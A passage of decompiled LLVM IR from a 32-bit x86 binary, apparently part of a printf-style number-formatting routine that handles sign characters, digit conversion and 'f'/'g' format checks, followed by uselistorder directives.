dec_label_pc_804e962:                             ; preds = %dec_label_pc_804e91e
  %v4_804e964 = icmp eq i1 %v1_804e91a, false
  br i1 %v4_804e964, label %dec_label_pc_804e96f, label %dec_label_pc_804e966

dec_label_pc_804e966:                             ; preds = %dec_label_pc_804e962
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804e969

dec_label_pc_804e969:                             ; preds = %dec_label_pc_804e8e5, %dec_label_pc_804e966
  %v0_804e9b1112 = phi i32 [ %v1_804e975, %dec_label_pc_804e8e5 ], [ -1, %dec_label_pc_804e966 ]
  %v2_804e969 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_804e969, i32* @ecx, align 4
  br label %dec_label_pc_804e97e

dec_label_pc_804e96f:                             ; preds = %dec_label_pc_804e962
  %v2_804e973 = add i32 %v1_804e8f4, %v1_804e975
  store i32 %v2_804e973, i32* %edi.global-to-local, align 4
  %v2_804e975 = sub i32 %v2_804e918, %v1_804e975
  store i32 %v2_804e975, i32* %edx.global-to-local, align 4
  %v2_804e977 = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_804e977, i32* @ecx, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804e97e

dec_label_pc_804e97e:                             ; preds = %dec_label_pc_804e969, %dec_label_pc_804e95e, %dec_label_pc_804e96f
  %v0_804e9b1111 = phi i32 [ %v0_804e9b1112, %dec_label_pc_804e969 ], [ -1, %dec_label_pc_804e95e ], [ -1, %dec_label_pc_804e96f ]
  %v0_804e99a = phi i32 [ %v2_804e969, %dec_label_pc_804e969 ], [ %storemerge28, %dec_label_pc_804e95e ], [ %v2_804e977, %dec_label_pc_804e96f ]
  %v0_804e98b = phi i32 [ %v2_804e918, %dec_label_pc_804e969 ], [ 0, %dec_label_pc_804e95e ], [ %v2_804e975, %dec_label_pc_804e96f ]
  store i32 %tmp156, i32* %eax.global-to-local, align 4
  %v2_804e985 = inttoptr i32 %v1_804e5fb to i8*
  %v3_804e985 = load i8, i8* %v2_804e985, align 1
  %v4_804e985 = and i8 %v3_804e985, 16
  %v5_804e985 = icmp eq i8 %v4_804e985, 0
  %v1_804e989 = icmp eq i1 %v5_804e985, false
  br i1 %v1_804e989, label %dec_label_pc_804e99a, label %dec_label_pc_804e98b

dec_label_pc_804e98b:                             ; preds = %dec_label_pc_804e97e
  %v1_804e98b = icmp eq i32 %v0_804e98b, 0
  %v1_804e98d = icmp eq i1 %v1_804e98b, false
  br i1 %v1_804e98d, label %dec_label_pc_804e99a, label %dec_label_pc_804e98f

dec_label_pc_804e98f:                             ; preds = %dec_label_pc_804e98b
  br i1 %v12_804e7f3, label %dec_label_pc_804e9b1, label %dec_label_pc_804e996

dec_label_pc_804e996:                             ; preds = %dec_label_pc_804e98f
  %v0_804e996 = load i32, i32* %ebp.global-to-local, align 4
  %tmp189 = icmp slt i32 %v0_804e996, 1
  br i1 %tmp189, label %dec_label_pc_804e9b1, label %dec_label_pc_804e99a

dec_label_pc_804e99a:                             ; preds = %dec_label_pc_804e996, %dec_label_pc_804e98b, %dec_label_pc_804e97e
  %v1_804e99a = inttoptr i32 %v0_804e99a to i32*
  store i32 112, i32* %v1_804e99a, align 4
  %v0_804e9a0 = load i32, i32* @ecx, align 4
  %v1_804e9a0 = add i32 %v0_804e9a0, 4
  %v2_804e9a0 = inttoptr i32 %v1_804e9a0 to i32*
  store i32 1, i32* %v2_804e9a0, align 4
  %v0_804e9a7 = load i32, i32* @ecx, align 4
  %v1_804e9a7 = add i32 %v0_804e9a7, 8
  %v2_804e9a7 = inttoptr i32 %v1_804e9a7 to i32*
  store i32 ptrtoint (i32* @global_var_8052cc0.397 to i32), i32* %v2_804e9a7, align 4
  %v0_804e9ae = load i32, i32* @ecx, align 4
  %v1_804e9ae = add i32 %v0_804e9ae, 12
  store i32 %v1_804e9ae, i32* @ecx, align 4
  %v0_804e9b1.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804e9b1

dec_label_pc_804e9b1:                             ; preds = %dec_label_pc_804e996, %dec_label_pc_804e98f, %dec_label_pc_804e99a
  %v0_804e9b8 = phi i32 [ %v0_804e99a, %dec_label_pc_804e996 ], [ %v0_804e99a, %dec_label_pc_804e98f ], [ %v1_804e9ae, %dec_label_pc_804e99a ]
  %v0_804e9b1 = phi i32 [ %v0_804e9b1111, %dec_label_pc_804e996 ], [ %v0_804e9b1111, %dec_label_pc_804e98f ], [ %v0_804e9b1.pre, %dec_label_pc_804e99a ]
  %v1_804e9b1 = add i32 %v0_804e9b1, 1
  %v8_804e9b1 = icmp eq i32 %v1_804e9b1, 0
  store i32 %v1_804e9b1, i32* %ebx.global-to-local, align 4
  br i1 %v8_804e9b1, label %dec_label_pc_804e9cb, label %dec_label_pc_804e9b4

dec_label_pc_804e9b4:                             ; preds = %dec_label_pc_804e9b1
  %v1_804e9b6 = sub i32 -1, %v0_804e9b1
  store i32 %v1_804e9b6, i32* %eax.global-to-local, align 4
  %v1_804e9b8 = inttoptr i32 %v0_804e9b8 to i32*
  store i32 176, i32* %v1_804e9b8, align 4
  %v0_804e9be = load i32, i32* %eax.global-to-local, align 4
  %v1_804e9be = load i32, i32* @ecx, align 4
  %v2_804e9be = add i32 %v1_804e9be, 4
  %v3_804e9be = inttoptr i32 %v2_804e9be to i32*
  store i32 %v0_804e9be, i32* %v3_804e9be, align 4
  %v0_804e9c1 = load i32, i32* @ecx, align 4
  %v1_804e9c1 = add i32 %v0_804e9c1, 8
  %v2_804e9c1 = inttoptr i32 %v1_804e9c1 to i32*
  store i32 ptrtoint (i32* @global_var_8052cb3.396 to i32), i32* %v2_804e9c1, align 4
  %v0_804e9c8 = load i32, i32* @ecx, align 4
  %v1_804e9c8 = add i32 %v0_804e9c8, 12
  store i32 %v1_804e9c8, i32* @ecx, align 4
  br label %dec_label_pc_804e9cb

dec_label_pc_804e9cb:                             ; preds = %dec_label_pc_804e9b1, %dec_label_pc_804e9b4
  %v0_804e9cf = phi i32 [ %v0_804e9b8, %dec_label_pc_804e9b1 ], [ %v1_804e9c8, %dec_label_pc_804e9b4 ]
  %v0_804e9cb = load i32, i32* %edx.global-to-local, align 4
  %v1_804e9cb = icmp eq i32 %v0_804e9cb, 0
  br i1 %v1_804e9cb, label %dec_label_pc_804e9de, label %dec_label_pc_804e9cf

dec_label_pc_804e9cf:                             ; preds = %dec_label_pc_804e9cb
  %v1_804e9cf = inttoptr i32 %v0_804e9cf to i32*
  store i32 112, i32* %v1_804e9cf, align 4
  %v0_804e9d5 = load i32, i32* %edx.global-to-local, align 4
  %v1_804e9d5 = load i32, i32* @ecx, align 4
  %v2_804e9d5 = add i32 %v1_804e9d5, 4
  %v3_804e9d5 = inttoptr i32 %v2_804e9d5 to i32*
  store i32 %v0_804e9d5, i32* %v3_804e9d5, align 4
  %v0_804e9d8 = load i32, i32* %edi.global-to-local, align 4
  %v1_804e9d8 = load i32, i32* @ecx, align 4
  %v2_804e9d8 = add i32 %v1_804e9d8, 8
  %v3_804e9d8 = inttoptr i32 %v2_804e9d8 to i32*
  store i32 %v0_804e9d8, i32* %v3_804e9d8, align 4
  %v0_804e9db = load i32, i32* @ecx, align 4
  %v1_804e9db = add i32 %v0_804e9db, 12
  store i32 %v1_804e9db, i32* @ecx, align 4
  br label %dec_label_pc_804e9de

dec_label_pc_804e9de:                             ; preds = %dec_label_pc_804e9cb, %dec_label_pc_804e9cf
  %v0_804e9fc = phi i32 [ %v0_804e9cf, %dec_label_pc_804e9cb ], [ %v1_804e9db, %dec_label_pc_804e9cf ]
  br i1 %v1_804e7f8, label %dec_label_pc_804e9f2, label %dec_label_pc_804e9e5

dec_label_pc_804e9e5:                             ; preds = %dec_label_pc_804e9de
  store i32 %tmp156, i32* %eax.global-to-local, align 4
  %v3_804e9ec = load i8, i8* %v2_804e985, align 1
  %v4_804e9ec = and i8 %v3_804e9ec, 16
  %v5_804e9ec = icmp eq i8 %v4_804e9ec, 0
  br i1 %v5_804e9ec, label %dec_label_pc_804ea0f, label %dec_label_pc_804e9f2

dec_label_pc_804e9f2:                             ; preds = %dec_label_pc_804e9e5, %dec_label_pc_804e9de
  %v0_804e9f2 = load i32, i32* %edx.global-to-local, align 4
  %v1_804e9f4 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804e9f4 = sub i32 %v0_804e9f2, %v1_804e9f4
  store i32 %v2_804e9f4, i32* %eax.global-to-local, align 4
  %v1_804e9f6 = load i32, i32* %ebp.global-to-local, align 4
  %v2_804e9f6 = sub i32 %v2_804e9f4, %v1_804e9f6
  %v8_804e9f6 = xor i32 %v1_804e9f6, %v2_804e9f4
  %v9_804e9f6 = xor i32 %v2_804e9f6, %v2_804e9f4
  %v10_804e9f6 = and i32 %v9_804e9f6, %v8_804e9f6
  %v11_804e9f6 = icmp slt i32 %v10_804e9f6, 0
  %v13_804e9f6 = icmp slt i32 %v2_804e9f6, 0
  %v2_804e9f8 = icmp eq i1 %v13_804e9f6, %v11_804e9f6
  br i1 %v2_804e9f8, label %dec_label_pc_804ea0f, label %dec_label_pc_804e9fa

dec_label_pc_804e9fa:                             ; preds = %dec_label_pc_804e9f2
  %v2_804e9fa = sub i32 %v1_804e9f6, %v2_804e9f4
  store i32 %v2_804e9fa, i32* %ebp.global-to-local, align 4
  %v1_804e9fc = inttoptr i32 %v0_804e9fc to i32*
  store i32 176, i32* %v1_804e9fc, align 4
  %v0_804ea02 = load i32, i32* %ebp.global-to-local, align 4
  %v1_804ea02 = load i32, i32* @ecx, align 4
  %v2_804ea02 = add i32 %v1_804ea02, 4
  %v3_804ea02 = inttoptr i32 %v2_804ea02 to i32*
  store i32 %v0_804ea02, i32* %v3_804ea02, align 4
  %v0_804ea05 = load i32, i32* @ecx, align 4
  %v1_804ea05 = add i32 %v0_804ea05, 8
  %v2_804ea05 = inttoptr i32 %v1_804ea05 to i32*
  store i32 ptrtoint (i32* @global_var_8052cb3.396 to i32), i32* %v2_804ea05, align 4
  %v0_804ea0c = load i32, i32* @ecx, align 4
  %v1_804ea0c = add i32 %v0_804ea0c, 12
  store i32 %v1_804ea0c, i32* @ecx, align 4
  br label %dec_label_pc_804ea0f

dec_label_pc_804ea0f:                             ; preds = %dec_label_pc_804e9f2, %dec_label_pc_804e9e5, %dec_label_pc_804e9fa
  %v1_804ea97121 = phi i32 [ %v0_804e9fc, %dec_label_pc_804e9f2 ], [ %v0_804e9fc, %dec_label_pc_804e9e5 ], [ %v1_804ea0c, %dec_label_pc_804e9fa ]
  %v12_804ea0f = icmp eq i8 %stack_var_-197.2, 102
  br i1 %v12_804ea0f, label %dec_label_pc_804ea8a, label %dec_label_pc_804ea16

dec_label_pc_804ea16:                             ; preds = %dec_label_pc_804ea0f
  %v5_804ea16 = load i32, i32* %edx.global-to-local, align 4
  %v6_804ea16 = and i32 %v5_804ea16, -256
  %v7_804ea16 = or i32 %v6_804ea16, %stack_var_-42.0
  store i32 %v7_804ea16, i32* %edx.global-to-local, align 4
  %v0_804ea1d = load i32, i32* %esi.global-to-local, align 4
  %v2_804ea1d = icmp slt i32 %v0_804ea1d, 0
  %v1_804ea1f = trunc i32 %stack_var_-42.0 to i8
  br i1 %v2_804ea1d, label %dec_label_pc_804ea2e, label %dec_label_pc_804ea37

dec_label_pc_804ea2e:                             ; preds = %dec_label_pc_804ea16
  store i32 %v0_804ea1d, i32* %edx.global-to-local, align 4
  %v1_804ea30 = sub i32 0, %v0_804ea1d
  br label %dec_label_pc_804ea37

dec_label_pc_804ea37:                             ; preds = %dec_label_pc_804ea16, %dec_label_pc_804ea2e
  %storemerge27 = phi i32 [ %v1_804ea30, %dec_label_pc_804ea2e ], [ %v0_804ea1d, %dec_label_pc_804ea16 ]
  %storemerge9 = phi i8 [ 45, %dec_label_pc_804ea2e ], [ 43, %dec_label_pc_804ea16 ]
  store i32 %storemerge27, i32* %edx.global-to-local, align 4
  store i32 0, i32* %stack_var_-27, align 4
  %v2_804ea3f = ptrtoint i32* %stack_var_-27 to i32
  store i32 %v2_804ea3f, i32* %ebx.global-to-local, align 4
  store i32 2, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804ea4b

dec_label_pc_804ea4b:                             ; preds = %dec_label_pc_804ea4b.backedge, %dec_label_pc_804ea37
  %v0_804ea56 = phi i32 [ %v0_804ea56.pre, %dec_label_pc_804ea4b.backedge ], [ %v2_804ea3f, %dec_label_pc_804ea37 ]
  %v0_804ea53 = phi i32 [ %v0_804ea53.pre, %dec_label_pc_804ea4b.backedge ], [ 2, %dec_label_pc_804ea37 ]
  %v0_804ea4b = phi i32 [ %v9_804ea54, %dec_label_pc_804ea4b.backedge ], [ %storemerge27, %dec_label_pc_804ea37 ]
  %v1_804ea52 = ashr i32 %v0_804ea4b, 31
  %v1_804ea53 = add i32 %v0_804ea53, 1
  store i32 %v1_804ea53, i32* %edi.global-to-local, align 4
  %v2_804ea54 = zext i32 %v0_804ea4b to i64
  %v4_804ea54 = zext i32 %v1_804ea52 to i64
  %v5_804ea54 = mul nuw i64 %v4_804ea54, 4294967296
  %v6_804ea54 = or i64 %v5_804ea54, %v2_804ea54
  %v8_804ea54 = sdiv i64 %v6_804ea54, 10
  %v9_804ea54 = trunc i64 %v8_804ea54 to i32
  %v10_804ea54 = srem i64 %v6_804ea54, 10
  %v1_804ea56 = add i32 %v0_804ea56, -1
  store i32 %v1_804ea56, i32* %ebx.global-to-local, align 4
  store i32 %v9_804ea54, i32* %esi.global-to-local, align 4
  %v3_804ea59 = and i32 %v9_804ea54, -256
  %v1_804ea5b = trunc i64 %v10_804ea54 to i8
  %v2_804ea5b = add i8 %v1_804ea5b, 48
  %v12_804ea5b = zext i8 %v2_804ea5b to i32
  %v15_804ea5b = or i32 %v12_804ea5b, %v3_804ea59
  store i32 %v15_804ea5b, i32* %eax.global-to-local, align 4
  %v3_804ea60 = inttoptr i32 %v1_804ea56 to i8*
  store i8 %v2_804ea5b, i8* %v3_804ea60, align 1
  store i32 %v9_804ea54, i32* %edx.global-to-local, align 4
  %v7_804ea64 = icmp sgt i32 %v1_804ea53, 3
  br i1 %v7_804ea64, label %dec_label_pc_804ea66, label %dec_label_pc_804ea4b.backedge

dec_label_pc_804ea66:                             ; preds = %dec_label_pc_804ea4b
  %v2_804ea66 = icmp eq i32 %v9_804ea54, 0
  %v1_804ea68 = icmp eq i1 %v2_804ea66, false
  br i1 %v1_804ea68, label %dec_label_pc_804ea4b.backedge, label %dec_label_pc_804ea6a

dec_label_pc_804ea4b.backedge:                    ; preds = %dec_label_pc_804ea66, %dec_label_pc_804ea4b
  %v0_804ea53.pre = load i32, i32* %edi.global-to-local, align 4
  %v0_804ea56.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804ea4b

dec_label_pc_804ea6a:                             ; preds = %dec_label_pc_804ea66
  %v4_804ea6a = zext i8 %storemerge9 to i32
  %v7_804ea6a = or i32 %v3_804ea59, %v4_804ea6a
  store i32 %v7_804ea6a, i32* %edx.global-to-local, align 4
  %v0_804ea6e = load i32, i32* %ebx.global-to-local, align 4
  %v1_804ea6e = add i32 %v0_804ea6e, -2
  store i32 %v1_804ea6e, i32* %eax.global-to-local, align 4
  %v3_804ea71 = add i32 %v0_804ea6e, -1
  %v4_804ea71 = inttoptr i32 %v3_804ea71 to i8*
  store i8 %storemerge9, i8* %v4_804ea71, align 1
  %v5_804ea74 = load i32, i32* %edx.global-to-local, align 4
  %v6_804ea74 = and i32 %v5_804ea74, -256
  %v7_804ea74 = or i32 %v6_804ea74, %stack_var_-42.0
  store i32 %v7_804ea74, i32* %edx.global-to-local, align 4
  %v2_804ea78 = load i32, i32* %ebx.global-to-local, align 4
  %v3_804ea78 = add i32 %v2_804ea78, -2
  %v4_804ea78 = inttoptr i32 %v3_804ea78 to i8*
  store i8 %v1_804ea1f, i8* %v4_804ea78, align 1
  %v0_804ea7b = load i32, i32* @ecx, align 4
  %v1_804ea7b = inttoptr i32 %v0_804ea7b to i32*
  store i32 112, i32* %v1_804ea7b, align 4
  %v0_804ea81 = load i32, i32* %edi.global-to-local, align 4
  %v1_804ea81 = load i32, i32* @ecx, align 4
  %v2_804ea81 = add i32 %v1_804ea81, 4
  %v3_804ea81 = inttoptr i32 %v2_804ea81 to i32*
  store i32 %v0_804ea81, i32* %v3_804ea81, align 4
  %v0_804ea84 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ea84 = load i32, i32* @ecx, align 4
  %v2_804ea84 = add i32 %v1_804ea84, 8
  %v3_804ea84 = inttoptr i32 %v2_804ea84 to i32*
  store i32 %v0_804ea84, i32* %v3_804ea84, align 4
  %v0_804ea87 = load i32, i32* @ecx, align 4
  %v1_804ea87 = add i32 %v0_804ea87, 12
  store i32 %v1_804ea87, i32* @ecx, align 4
  br label %dec_label_pc_804ea8a

dec_label_pc_804ea8a:                             ; preds = %dec_label_pc_804ea0f, %dec_label_pc_804e6b9, %dec_label_pc_804ea6a
  %v0_804eb09 = phi i32 [ %v1_804ea97121, %dec_label_pc_804ea0f ], [ %v2_804e6c1, %dec_label_pc_804e6b9 ], [ %v1_804ea87, %dec_label_pc_804ea6a ]
  %v2_804ea8a = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_804ea8a, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ea8e

dec_label_pc_804ea8e:                             ; preds = %dec_label_pc_804ea8e, %dec_label_pc_804ea8a
  %v0_804ea8e = phi i32 [ %v2_804ea8a, %dec_label_pc_804ea8a ], [ %v1_804ea90, %dec_label_pc_804ea8e ]
  %stack_var_-216.0 = phi i32 [ %v3_804e5bb, %dec_label_pc_804ea8a ], [ %v5_804ea93, %dec_label_pc_804ea8e ]
  %v1_804ea8e = inttoptr i32 %v0_804ea8e to i32*
  %v2_804ea8e = load i32, i32* %v1_804ea8e, align 4
  store i32 %v2_804ea8e, i32* %ebx.global-to-local, align 4
  %v1_804ea90 = add i32 %v0_804ea8e, 12
  store i32 %v1_804ea90, i32* %eax.global-to-local, align 4
  %v5_804ea93 = sub i32 %stack_var_-216.0, %v2_804ea8e
  %v7_804ea97 = icmp ult i32 %v1_804ea90, %v0_804eb09
  br i1 %v7_804ea97, label %dec_label_pc_804ea8e, label %dec_label_pc_804ea9b

dec_label_pc_804ea9b:                             ; preds = %dec_label_pc_804ea8e
  store i32 %v0_804eb09, i32* %esi.global-to-local, align 4
  %v5_804eaae = icmp eq i8 %stack_var_-26.0, 0
  store i32 160, i32* %stack_var_-168, align 4
  %v1_804eabe = icmp eq i1 %v5_804eaae, false
  %v2_804eabe = zext i1 %v1_804eabe to i32
  store i32 %v2_804eabe, i32* %edx.global-to-local, align 4
  %v2_804eac1 = sub i32 %v5_804ea93, %v2_804eabe
  store i32 %v2_804eac1, i32* %eax.global-to-local, align 4
  %tmp190 = icmp slt i32 %v2_804eac1, 1
  br i1 %tmp190, label %dec_label_pc_804eb0b, label %dec_label_pc_804eacb

dec_label_pc_804eacb:                             ; preds = %dec_label_pc_804ea9b
  store i32 %tmp156, i32* %edx.global-to-local, align 4
  %v2_804ead2 = inttoptr i32 %v1_804e5fb to i8*
  %v3_804ead2 = load i8, i8* %v2_804ead2, align 1
  %v4_804ead2 = and i8 %v3_804ead2, 8
  %v5_804ead2 = icmp eq i8 %v4_804ead2, 0
  br i1 %v5_804ead2, label %dec_label_pc_804eaed, label %dec_label_pc_804ead8

dec_label_pc_804ead8:                             ; preds = %dec_label_pc_804eacb
  %v1_804ead8 = add i32 %v0_804eb09, 12
  store i32 %v1_804ead8, i32* %esi.global-to-local, align 4
  %v1_804eadb = inttoptr i32 %v0_804eb09 to i32*
  store i32 160, i32* %v1_804eadb, align 4
  %v1_804eae1 = load i32, i32* @ecx, align 4
  %v2_804eae1 = add i32 %v1_804eae1, 4
  %v3_804eae1 = inttoptr i32 %v2_804eae1 to i32*
  store i32 %v2_804eac1, i32* %v3_804eae1, align 4
  %v0_804eae4 = load i32, i32* @ecx, align 4
  %v1_804eae4 = add i32 %v0_804eae4, 8
  %v2_804eae4 = inttoptr i32 %v1_804eae4 to i32*
  store i32 ptrtoint (i32* @global_var_8052cb3.396 to i32), i32* %v2_804eae4, align 4
  br label %dec_label_pc_804eb0b

dec_label_pc_804eaed:                             ; preds = %dec_label_pc_804eacb
  store i32 %tmp156, i32* %ebx.global-to-local, align 4
  %v1_804eaf4 = add i32 %tmp156, 16
  %v2_804eaf4 = inttoptr i32 %v1_804eaf4 to i32*
  %v3_804eaf4 = load i32, i32* %v2_804eaf4, align 4
  %v9_804eaf4 = icmp eq i32 %v3_804eaf4, 48
  %v1_804eaf8 = icmp eq i1 %v9_804eaf4, false
  br i1 %v1_804eaf8, label %dec_label_pc_804eb05, label %dec_label_pc_804eafa

dec_label_pc_804eafa:                             ; preds = %dec_label_pc_804eaed
  %v3_804eafa = load i32, i32* %stack_var_-152, align 4
  %v5_804eafa = add i32 %v3_804eafa, %v2_804eac1
  store i32 %v5_804eafa, i32* %stack_var_-152, align 4
  br label %dec_label_pc_804eb09

dec_label_pc_804eb00:                             ; preds = %dec_label_pc_804eb11
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804eb38

dec_label_pc_804eb05:                             ; preds = %dec_label_pc_804eaed
  br label %dec_label_pc_804eb09

dec_label_pc_804eb09:                             ; preds = %dec_label_pc_804eafa, %dec_label_pc_804eb05
  store i32 %v0_804eb09, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804eb0b

dec_label_pc_804eb0b:                             ; preds = %dec_label_pc_804ea9b, %dec_label_pc_804ead8, %dec_label_pc_804eb09
  store i32 0, i32* %edi.global-to-local, align 4
  %v2_804eb0d = ptrtoint i32* %stack_var_-168 to i32
  store i32 %v2_804eb0d, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804eb11

dec_label_pc_804eb11:                             ; preds = %dec_label_pc_804eb2f, %dec_label_pc_804eb0b
  call void @__pseudo_call(i32 %tmp156)
  %v1_804eb2a = load i32, i32* %ebx.global-to-local, align 4
  %v2_804eb2a = add i32 %v1_804eb2a, 4
  %v3_804eb2a = inttoptr i32 %v2_804eb2a to i32*
  %v4_804eb2a = load i32, i32* %v3_804eb2a, align 4
  %v15_804eb2a = icmp eq i32 %v2_804eac1, %v4_804eb2a
  %v1_804eb2d = icmp eq i1 %v15_804eb2a, false
  br i1 %v1_804eb2d, label %dec_label_pc_804eb00, label %dec_label_pc_804eb2f

dec_label_pc_804eb2f:                             ; preds = %dec_label_pc_804eb11
  %v1_804eb2f = add i32 %v1_804eb2a, 12
  store i32 %v1_804eb2f, i32* %ebx.global-to-local, align 4
  %v0_804eb32 = load i32, i32* %edi.global-to-local, align 4
  %v2_804eb32 = add i32 %v0_804eb32, %v2_804eac1
  store i32 %v2_804eb32, i32* %edi.global-to-local, align 4
  %v1_804eb34 = load i32, i32* %esi.global-to-local, align 4
  %v7_804eb34 = icmp ult i32 %v1_804eb2f, %v1_804eb34
  br i1 %v7_804eb34, label %dec_label_pc_804eb11, label %dec_label_pc_804eb38

dec_label_pc_804eb38:                             ; preds = %dec_label_pc_804eb2f, %dec_label_pc_804eb00
  %v0_804eb3e = phi i32 [ -1, %dec_label_pc_804eb00 ], [ %v2_804eb32, %dec_label_pc_804eb2f ]
  store i32 %v0_804eb3e, i32* %eax.global-to-local, align 4
  %v2_804eb41 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804eb41, i32* @esi, align 4
  store i32 %v0_804e59e, i32* @edi, align 4
  store i32 %v0_804e59d, i32* @ebp, align 4
  ret i32 %v0_804eb3e

; uselistorder directives
  uselistorder i32 %v0_804eb3e, { 1, 0 }
  uselistorder i32 %v2_804eac1, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32 %v2_804eabe, { 1, 0 }
  uselistorder i32 %v1_804ea90, { 1, 2, 0 }
  uselistorder i32 %v0_804ea8e, { 1, 0 }
  uselistorder i32 %v0_804eb09, { 1, 3, 2, 4, 0 }
  uselistorder i32 %v9_804ea54, { 3, 2, 1, 0, 4 }
  uselistorder i8 %storemerge9, { 1, 0 }
  uselistorder i32 %v0_804ea1d, { 2, 1, 0, 3 }
  uselistorder i32 %v2_804e9f6, { 1, 0 }
  uselistorder i32 %v1_804e9f6, { 1, 0, 2 }
  uselistorder i32 %v2_804e9f4, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_804e9b1, { 1, 0 }
  uselistorder i32 %v2_804e91e, { 2, 1, 3, 0 }
  uselistorder i32 %v2_804e918, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_804e975, { 4, 0, 3, 1, 2, 5, 6, 7 }
  uselistorder i32 %v1_804e8b4, { 1, 0 }
  uselistorder i32 %v0_804e8af, { 1, 2, 0, 3 }
  uselistorder i32 %v2_804e87c, { 1, 2, 3, 0, 4 }
  uselistorder i8 %v2_804e877, { 1, 0 }
  uselistorder i8 %v2_804e870, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v0_804e870, { 1, 0, 3, 2 }
  uselistorder i32 %stack_var_-220.3, { 1, 0 }
  uselistorder i32 %v0_804e7fa, { 1, 2, 0 }
  uselistorder i32 %stack_var_-42.0, { 0, 2, 1 }
  uselistorder i8 %stack_var_-207.1, { 4, 3, 1, 5, 0, 2 }
  uselistorder i8 %v4_804e7df, { 1, 0 }
  uselistorder i32 %tmp195, { 3, 1, 2, 0 }
  uselistorder x86_fp80 %v3_804e7aa, { 1, 0 }
  uselistorder i32 %v2_804e763, { 2, 1, 0 }
  uselistorder i32 %v0_804e819, { 1, 2, 0, 3 }
  uselistorder x86_fp80 %v1_804e735, { 1, 0 }
  uselistorder x86_fp80 %v3_804e717, { 2, 0, 1, 3, 6, 7, 5, 8, 4, 9, 10 }
  uselistorder i32 %v3_804e714, { 1, 0 }
  uselistorder x86_fp80 %v4_804e6fc, { 2, 0, 1, 3, 4 }
  uselistorder x86_fp80 %v3_804e6f6, { 1, 2, 0 }
  uselistorder i32 %v3_804e6f3, { 1, 0 }
  uselistorder i32 %v1_804e6ec, { 3, 0, 1, 2 }
  uselistorder i32 %stack_var_-220.0, { 2, 0, 1 }
  uselistorder x86_fp80 %v1_804e725, { 8, 1, 2, 5, 3, 4, 6, 0, 7, 9 }
  uselistorder x86_fp80 %v2_804e6ed, { 1, 0 }
  uselistorder i8 %v4_804e69d, { 1, 0 }
  uselistorder i3 %v1_804e63a, { 1, 0, 2 }
  uselistorder i8 %stack_var_-207.0, { 3, 2, 0, 4, 5, 1, 6, 7 }
  uselistorder i8 %v3_804e5c2, { 1, 0, 2, 3 }
  uselistorder i32 %v3_804e5bb, { 1, 0, 2 }
  uselistorder i3 %v4_804e5b4, { 0, 2, 1, 3 }
  uselistorder i32* %stack_var_-144, { 1, 0, 2 }
  uselistorder i32* %stack_var_-72, { 1, 0, 2 }
  uselistorder i32* %stack_var_-71, { 1, 0 }
  uselistorder i32* %stack_var_-132, { 2, 0, 1 }
  uselistorder i32* %stack_var_-27, { 1, 0 }
  uselistorder i32* %stack_var_-152, { 0, 1, 4, 2, 3 }
  uselistorder i32* %stack_var_-168, { 1, 0 }
  uselistorder i32 %tmp156, { 14, 13, 12, 11, 10, 9, 8, 7, 0, 6, 1, 2, 3, 5, 4 }
  uselistorder x86_fp80 %tmp155, { 3, 2, 1, 0, 4, 5 }
  uselistorder x86_fp80* %st1.global-to-local, { 7, 6, 8, 12, 11, 9, 0, 1, 4, 2, 3, 5, 10 }
  uselistorder x86_fp80* %st0.global-to-local, { 1, 6, 7, 8, 2, 3, 0, 4, 5 }
  uselistorder i3* %fpu_stat_TOP.global-to-local, { 0, 5, 4, 6, 7, 8, 1, 9, 10, 2, 3 }
  uselistorder i32* %esi.global-to-local, { 2, 0, 1, 3, 4, 7, 6, 8, 5, 9, 10, 11, 12 }
  uselistorder i32* %edx.global-to-local, { 2, 3, 4, 5, 6, 7, 1, 8, 9, 12, 14, 13, 15, 10, 11, 16, 19, 17, 20, 18, 21, 22, 23, 24, 25, 0, 26, 27, 28 }
  uselistorder i32* %edi.global-to-local, { 0, 2, 3, 1, 4, 5, 6, 7, 9, 8, 10 }
  uselistorder i32* %ebx.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 26, 12, 13, 27, 14, 15, 16, 17, 21, 22, 18, 19, 20, 23, 24, 25, 28, 29 }
  uselistorder i32* %ebp.global-to-local, { 0, 1, 5, 6, 2, 7, 4, 3, 8, 9, 10 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 2, 3, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32 }
  uselistorder i64 10, { 1, 0, 2 }
  uselistorder i8 43, { 2, 1, 0 }
  uselistorder i8 45, { 1, 2, 0 }
  uselistorder i8 102, { 2, 3, 1, 0 }
  uselistorder i8 103, { 1, 2, 0 }
  uselistorder x86_fp80 0xK401CEE6B280000000000, { 1, 2, 0 }
  uselistorder i32 4096, { 0, 9, 1, 10, 11, 2, 8, 6, 7, 3, 4, 5 }
  uselistorder i32 13, { 0, 4, 3, 1, 2 }
  uselistorder x86_fp80 0xK3FFD8000000000000000, { 1, 0, 2, 3 }
  uselistorder x86_fp80 0xK00000000000000000000, { 0, 2, 3, 4, 1 }
  uselistorder label %dec_label_pc_804eb0b, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804eb09, { 1, 0 }
  uselistorder label %dec_label_pc_804ea8a, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804ea37, { 1, 0 }
  uselistorder label %dec_label_pc_804ea0f, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804e9de, { 1, 0 }
